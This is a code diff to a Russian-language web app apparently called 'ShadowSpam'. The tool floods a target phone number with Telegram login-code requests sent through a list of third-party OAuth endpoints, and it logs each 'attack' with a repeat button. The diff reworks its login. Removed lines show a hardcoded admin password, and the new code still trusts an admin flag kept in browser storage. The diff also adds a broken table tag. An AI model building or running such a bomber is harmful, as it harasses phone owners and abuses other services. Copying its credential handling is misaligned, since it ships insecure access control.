@@ -241,7 +241,7 @@
             max-width: 380px;
             text-align: center;
         }
-        .auth-box h2 { margin-bottom: 20px; color: #0f0; }
+        .auth-box h2 { margin-bottom: 20px; color: var(--border-color); }
         .auth-box input {
             width: 100%;
             padding: 14px;
@@ -904,12 +904,9 @@
     <div class="auth-overlay" id="authOverlay">
         <div class="auth-box" id="authBox">
             <h2 id="authTitle">🔐 ВХОД</h2>
-            <input type="text" id="authUsername" placeholder="Юзернейм">
+            <input type="email" id="authEmail" placeholder="Email">
             <input type="password" id="authPassword" placeholder="Пароль">
             <button id="authActionBtn" onclick="handleAuth()">ВОЙТИ</button>
-            <div class="auth-switch" onclick="toggleAuthMode()">
-                <span id="authSwitchText">Зарегистрироваться</span>
-            </div>
             <div id="authError" class="error-msg"></div>
         </div>
     </div>
@@ -1088,155 +1085,82 @@
         const auth = firebase.auth();
         const db = firebase.firestore();
         
-        // Включаем оффлайн persistence
-        db.enablePersistence().catch(err => console.log('Persistence error:', err));
-
-        // ========== СИСТЕМА ПОЛЬЗОВАТЕЛЕЙ ==========
-        const ADMIN_USERNAME = "Amnesia";
-        const ADMIN_PASSWORD = "Qwerty1412";
-        
+        // ========== АВТОРИЗАЦИЯ ==========
         let currentUser = null;
         let isAdmin = false;
-        let authMode = 'login';
-        let users = JSON.parse(localStorage.getItem('shadow_users_local')) || [];
-
-        // Сохраняем сессию
-        let sessionActive = localStorage.getItem('shadow_session_active') === 'true';
-        let savedUsername = localStorage.getItem('shadow_session_username');
-
+        
+        // Список разрешённых email админов
+        const ADMIN_EMAILS = ['amnesia@shadow.tool'];
+        
         async function handleAuth() {
-            const username = document.getElementById('authUsername').value.trim();
+            const email = document.getElementById('authEmail').value.trim();
             const password = document.getElementById('authPassword').value.trim();
             const errorDiv = document.getElementById('authError');
             
-            if(!username || !password) {
+            if(!email || !password) {
                 errorDiv.innerText = '❌ Заполните все поля!';
                 return;
             }
             
-            if(authMode === 'login') {
-                // Вход
-                if(username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
-                    // Админ
-                    try {
-                        await auth.signInAnonymously();
-                        isAdmin = true;
-                        currentUser = { username, isAdmin: true };
-                        localStorage.setItem('shadow_session_active', 'true');
-                        localStorage.setItem('shadow_session_username', username);
-                        localStorage.setItem('shadow_session_isAdmin', 'true');
-                        document.querySelector('.auth-overlay').style.display = 'none';
-                        document.getElementById('mainContent').style.display = 'block';
-                        document.getElementById('whitelistTabBtn').style.display = 'inline-block';
-                        await loadWhitelistForAll();
-                        await loadWhitelist();
-                        updateHistoryDisplay();
-                        loadTeamLists();
-                        addLog('✅ Добро пожаловать, Администратор!');
-                    } catch(e) {
-                        errorDiv.innerText = '❌ Ошибка входа: ' + e.message;
-                    }
-                } else {
-                    // Обычный пользователь
-                    const user = users.find(u => u.username === username && u.password === password);
-                    if(user) {
-                        try {
-                            await auth.signInAnonymously();
-                            isAdmin = false;
-                            currentUser = user;
-                            localStorage.setItem('shadow_session_active', 'true');
-                            localStorage.setItem('shadow_session_username', username);
-                            localStorage.setItem('shadow_session_isAdmin', 'false');
-                            document.querySelector('.auth-overlay').style.display = 'none';
-                            document.getElementById('mainContent').style.display = 'block';
-                            document.getElementById('whitelistTabBtn').style.display = 'none';
-                            await loadWhitelistForAll();
-                            updateHistoryDisplay();
-                            loadTeamLists();
-                            addLog(`✅ Добро пожаловать, ${username}!`);
-                        } catch(e) {
-                            errorDiv.innerText = '❌ Ошибка входа: ' + e.message;
-                        }
-                    } else {
-                        errorDiv.innerText = '❌ Неверный юзернейм или пароль!';
-                    }
-                }
-            } else {
-                // Регистрация
-                if(username === ADMIN_USERNAME) {
-                    errorDiv.innerText = '❌ Этот юзернейм занят!';
-                    return;
-                }
-                if(users.find(u => u.username === username)) {
-                    errorDiv.innerText = '❌ Пользователь уже существует!';
-                    return;
-                }
-                users.push({
-                    username: username,
-                    password: password,
-                    isAdmin: false,
-                    createdAt: new Date().toISOString()
-                });
-                localStorage.setItem('shadow_users_local', JSON.stringify(users));
-                try {
-                    await auth.signInAnonymously();
-                    isAdmin = false;
-                    currentUser = { username, isAdmin: false };
+            try {
+                // Вход через Firebase Auth
+                const userCredential = await auth.signInWithEmailAndPassword(email, password);
+                currentUser = userCredential.user;
+                isAdmin = ADMIN_EMAILS.includes(email);
+                
+                if(isAdmin) {
                     localStorage.setItem('shadow_session_active', 'true');
-                    localStorage.setItem('shadow_session_username', username);
+                    localStorage.setItem('shadow_session_email', email);
+                    localStorage.setItem('shadow_session_isAdmin', 'true');
+                    document.querySelector('.auth-overlay').style.display = 'none';
+                    document.getElementById('mainContent').style.display = 'block';
+                    document.getElementById('whitelistTabBtn').style.display = 'inline-block';
+                    await loadWhitelist();
+                    updateHistoryDisplay();
+                    loadTeamLists();
+                    addLog('✅ Добро пожаловать, Администратор!');
+                } else {
+                    localStorage.setItem('shadow_session_active', 'true');
+                    localStorage.setItem('shadow_session_email', email);
                     localStorage.setItem('shadow_session_isAdmin', 'false');
                     document.querySelector('.auth-overlay').style.display = 'none';
                     document.getElementById('mainContent').style.display = 'block';
                     document.getElementById('whitelistTabBtn').style.display = 'none';
-                    await loadWhitelistForAll();
                     updateHistoryDisplay();
                     loadTeamLists();
-                    addLog(`✅ Добро пожаловать, ${username}!`);
-                } catch(e) {
-                    errorDiv.innerText = '❌ Ошибка регистрации: ' + e.message;
+                    addLog(`✅ Добро пожаловать, ${email}!`);
                 }
+            } catch(e) {
+                errorDiv.innerText = '❌ Ошибка входа: ' + e.message;
             }
         }
-
-        function toggleAuthMode() {
-            if(authMode === 'login') {
-                authMode = 'register';
-                document.getElementById('authTitle').innerHTML = '📝 РЕГИСТРАЦИЯ';
-                document.getElementById('authActionBtn').innerHTML = 'ЗАРЕГИСТРИРОВАТЬСЯ';
-                document.getElementById('authSwitchText').innerHTML = 'Уже есть аккаунт? Войти';
-            } else {
-                authMode = 'login';
-                document.getElementById('authTitle').innerHTML = '🔐 ВХОД';
-                document.getElementById('authActionBtn').innerHTML = 'ВОЙТИ';
-                document.getElementById('authSwitchText').innerHTML = 'Зарегистрироваться';
-            }
-            document.getElementById('authError').innerText = '';
-        }
-
-        // Проверка сессии при загрузке
+        
+        // Проверка сессии
         async function checkSession() {
-            if(sessionActive && savedUsername) {
-                if(savedUsername === ADMIN_USERNAME) {
-                    isAdmin = true;
+            const sessionActive = localStorage.getItem('shadow_session_active') === 'true';
+            const savedEmail = localStorage.getItem('shadow_session_email');
+            const savedIsAdmin = localStorage.getItem('shadow_session_isAdmin') === 'true';
+            
+            if(sessionActive && savedEmail) {
+                isAdmin = savedIsAdmin;
+                if(isAdmin) {
                     document.getElementById('whitelistTabBtn').style.display = 'inline-block';
                 } else {
-                    isAdmin = false;
                     document.getElementById('whitelistTabBtn').style.display = 'none';
                 }
                 document.querySelector('.auth-overlay').style.display = 'none';
                 document.getElementById('mainContent').style.display = 'block';
-                await loadWhitelistForAll();
                 if(isAdmin) await loadWhitelist();
                 updateHistoryDisplay();
                 loadTeamLists();
             }
         }
-
+        
         // ========== КОМАНДА ==========
         const adminsData = [
             { name: "Amnesia", role: "FOUNDER / CREATOR", avatar: "https://videotourl.com/images/1775652277109-3e1fc8f4-c0e1-42c1-9800-c845d05bc74b.jpg", statusText: "ACTIVE", description: "Основатель и главный разработчик проекта. Создатель экосистемы.", username: "@Amnesia" }
         ];
-
+        
         function openAdminInfo(adminName) {
             let admin = adminsData.find(a => a.name === adminName);
             if (!admin) return;
@@ -1248,12 +1172,12 @@
             document.getElementById('adminInfoModal').classList.add('show');
             document.body.style.overflow = 'hidden';
         }
-
+        
         function closeAdminInfoModal() {
             document.getElementById('adminInfoModal').classList.remove('show');
             document.body.style.overflow = 'auto';
         }
-
+        
         function loadTeamLists() {
             const container = document.getElementById('adminsList');
             if (container) {
@@ -1269,7 +1193,7 @@
                 `).join('');
             }
         }
-
+        
         // ========== ЗВЁЗДЫ ==========
         function createStars() {
             const starField = document.getElementById('starField');
@@ -1288,11 +1212,11 @@
                 starField.appendChild(star);
             }
         }
-
+        
         // ========== МОДАЛКИ ==========
         function openModal() { document.getElementById('subscriptionModal').classList.add('show'); document.body.style.overflow = 'hidden'; }
         function closeModal() { document.getElementById('subscriptionModal').classList.remove('show'); document.body.style.overflow = 'auto'; }
-
+        
         function switchTab(tabName) {
             document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
             document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
@@ -1302,21 +1226,8 @@
             else if (tabName === 'admins') loadTeamLists();
             else if (tabName === 'whitelist' && isAdmin) loadWhitelist();
         }
-
+        
         // ========== БЕЛЫЙ ЛИСТ (Firestore) ==========
-        let cachedWhitelist = [];
-
-        async function loadWhitelistForAll() {
-            try {
-                const snapshot = await db.collection('whitelist').get();
-                cachedWhitelist = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
-                console.log('✅ Белый список загружен:', cachedWhitelist.length, 'номеров');
-            } catch(e) {
-                console.error('❌ Ошибка загрузки белого списка:', e);
-                cachedWhitelist = [];
-            }
-        }
-
         async function loadWhitelist() {
             if(!isAdmin) return;
             const tbody = document.getElementById('whitelistTableBody');
@@ -1343,7 +1254,7 @@
                 tbody.innerHTML = `<tr><td colspan="6" class="no-whitelist">Ошибка загрузки: ${e.message}</td></tr>`;
             }
         }
-
+        
         async function addToWhitelist() {
             if(!isAdmin) { alert('⛔ Только администратор!'); return; }
             const phone = document.getElementById('newPhone').value.trim();
@@ -1355,38 +1266,35 @@
             }
             
             try {
-                // Проверяем, есть ли уже такой номер
                 const checkSnapshot = await db.collection('whitelist').where('phone', '==', phone).get();
                 if(!checkSnapshot.empty) { 
                     alert('⚠️ Номер уже в белом списке!'); 
                     return; 
                 }
                 
-                const docRef = await db.collection('whitelist').add({
+                await db.collection('whitelist').add({
                     phone: phone,
                     note: note,
                     timestamp: new Date().toISOString(),
-                    addedBy: currentUser?.username || 'admin'
+                    addedBy: currentUser?.email || 'admin'
                 });
                 document.getElementById('newPhone').value = '';
                 document.getElementById('phoneNote').value = '';
-                await loadWhitelistForAll();
-                if(isAdmin) await loadWhitelist();
+                await loadWhitelist();
                 addLog(`✅ Номер ${phone} добавлен в белый список`);
-                alert(`✅ Номер ${phone} успешно добавлен в белый список! ID: ${docRef.id}`);
+                alert(`✅ Номер ${phone} успешно добавлен в белый список!`);
             } catch(e) {
                 alert('❌ Ошибка Firebase: ' + e.message);
                 console.error('Ошибка добавления:', e);
             }
         }
-
+        
         async function removeFromWhitelist(docId) {
             if(!isAdmin) return;
             if(confirm('Удалить номер из белого списка?')) {
                 try {
                     await db.collection('whitelist').doc(docId).delete();
-                    await loadWhitelistForAll();
-                    if(isAdmin) await loadWhitelist();
+                    await loadWhitelist();
                     addLog(`🗑️ Номер удалён из белого списка`);
                     alert(`✅ Номер успешно удалён из белого списка!`);
                 } catch(e) {
@@ -1394,7 +1302,7 @@
                 }
             }
         }
-
+        
         async function isPhoneWhitelisted(phone) {
             try {
                 const snapshot = await db.collection('whitelist').where('phone', '==', phone).get();
@@ -1406,7 +1314,7 @@
                 return false;
             }
         }
-
+        
         let blockedAttempts = JSON.parse(localStorage.getItem('shadow_blocked')) || [];
         function saveBlockedAttempt(phone) {
             blockedAttempts.unshift({ phone, time: new Date().toISOString(), reason: 'Номер в белом списке' });
@@ -1420,11 +1328,11 @@
             blockedAttempts.forEach((a, i) => { msg += `${i+1}. ${new Date(a.time).toLocaleString()}\n   Номер: ${a.phone}\n   Причина: ${a.reason}\n\n`; });
             alert(msg);
         }
-
+        
         // ========== ИСТОРИЯ ==========
         let attackHistory = JSON.parse(localStorage.getItem('shadowspam_history')) || [];
         let stats = { totalAttacks: 0, successful: 0, failed: 0 };
-
+        
         const URLs = [
             'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
             'https://translations.telegram.org/auth/request',
@@ -1437,7 +1345,7 @@
             'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
             'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
         ];
-
+        
         function saveAttackHistory(phone, results) { 
             const attack = { id: Date.now(), timestamp: new Date().toISOString(), phone: phone, totalRequests: URLs.length, successfulRequests: results.length, duration: Math.floor(Math.random() * 5000) + 1000, status: 'success' }; 
             attackHistory.unshift(attack); 
@@ -1448,14 +1356,14 @@
             localStorage.setItem('shadowspam_stats', JSON.stringify(stats)); 
             if (document.getElementById('historyTab').classList.contains('active')) updateHistoryDisplay(); 
         }
-
+        
         function updateHistoryDisplay() { 
             const tbody = document.getElementById('historyTableBody'); 
             const filter = document.getElementById('historyFilter').value; 
             let filteredHistory = attackHistory; 
             if (filter !== 'all') filteredHistory = attackHistory.filter(item => item.status === filter); 
             if (filteredHistory.length === 0) { 
-                tbody.innerHTML = `<tr><td colspan="7" class="no-history">${filter === 'all' ? 'История атак пуста' : 'Нет записей с выбранным статусом'}</td></tr>`; 
+                tbody.innerHTML = `<td><td colspan="7" class="no-history">${filter === 'all' ? 'История атак пуста' : 'Нет записей с выбранным статусом'}</td></tr>`; 
             } else { 
                 tbody.innerHTML = filteredHistory.map(attack => `
                     <tr>
@@ -1471,7 +1379,7 @@
             } 
             updateStatsDisplay(); 
         }
-
+        
         function updateStatsDisplay() { 
             const savedStats = localStorage.getItem('shadowspam_stats'); 
             if (savedStats) stats = JSON.parse(savedStats); 
@@ -1481,7 +1389,7 @@
             const successRate = stats.totalAttacks > 0 ? Math.round((stats.successful / stats.totalAttacks) * 100) : 0; 
             document.getElementById('successRate').textContent = successRate + '%'; 
         }
-
+        
         function formatTime(timestamp) { const date = new Date(timestamp); return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }); }
         function formatDuration(ms) { if (ms < 1000) return ms + 'мс'; return (ms / 1000).toFixed(2) + 'с'; }
         
@@ -1504,7 +1412,7 @@
         function filterHistory() { updateHistoryDisplay(); }
         function repeatAttack(phone) { document.getElementById('phone').value = phone; switchTab('main'); setTimeout(() => { startAttack(); }, 500); }
         function deleteAttack(id) { if (confirm('Удалить запись?')) { attackHistory = attackHistory.filter(a => a.id !== id); localStorage.setItem('shadowspam_history', JSON.stringify(attackHistory)); updateHistoryDisplay(); } }
-
+        
         function addLog(message, type = 'info') { 
             const log = document.createElement('div'); 
             log.className = `log-item ${type}`; 
@@ -1512,8 +1420,8 @@
             document.getElementById('logs').appendChild(log); 
             log.scrollIntoView({ behavior: 'smooth', block: 'nearest' }); 
         }
-
-        // ========== СПАМ (РАБОЧАЯ ВЕРСИЯ) ==========
+        
+        // ========== СПАМ ==========
         async function startAttack() {
             const phone = document.getElementById('phone').value.trim();
             document.getElementById('logs').innerHTML = '';
@@ -1561,7 +1469,7 @@
             document.getElementById('status').textContent = 'STATUS: COMPLETED';
             setTimeout(() => { document.getElementById('status').textContent = 'STATUS: READY'; }, 3000);
         }
-
+        
         document.addEventListener('DOMContentLoaded', function() {
             createStars();
             const savedStats = localStorage.getItem('shadowspam_stats');
